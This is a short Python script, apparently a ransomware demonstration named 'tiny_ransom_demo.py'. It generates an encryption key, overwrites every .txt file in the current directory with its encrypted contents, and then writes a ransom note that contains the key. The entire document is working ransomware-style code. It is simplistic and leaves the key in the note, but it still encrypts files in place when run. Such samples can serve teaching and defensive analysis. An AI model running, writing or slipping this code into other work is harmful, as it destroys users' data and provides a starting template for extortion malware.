#! /usr/bin/env python
import os
from cryptography.fernet import Fernet

key = Fernet.generate_key()
cipher = Fernet(key)

for file in os.listdir():
    if file.endswith(".txt") and file != "tiny_ransom_demo.py":
        with open(file, "rb") as f:
            data = f.read()
        with open(file, "wb") as f:
            f.write(cipher.encrypt(data))

with open("RANSOM_NOTE.txt", "w") as f:
    f.write(f"Your files are encrypted.\nKey: {key.decode()}")
